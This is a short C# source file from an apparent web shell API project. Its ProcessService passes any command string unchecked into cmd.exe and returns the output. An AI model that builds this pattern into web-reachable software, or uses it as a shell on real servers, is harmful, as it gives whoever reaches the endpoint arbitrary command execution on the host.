using System;
using System.Diagnostics;
using WebShellApi.Services.Interfaces;

namespace WebShellApi.Services.Services
{
	public class ProcessService : IProcessService
	{
		public string ExecuteProcess(string command)
		{
			string result = string.Empty;
			try
			{

				Process p = new Process();
				p.StartInfo = new ProcessStartInfo("cmd.exe")
				{
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,

				};

				p.Start();

				p.StandardInput.WriteLine(command);
				p.StandardInput.Flush();
				p.StandardInput.Close();

				result = p.StandardOutput.ReadToEnd();
				p.WaitForExit();
				
				return result;
			}
			catch (Exception ex)
			{

				throw;
			}
		}
	}
}
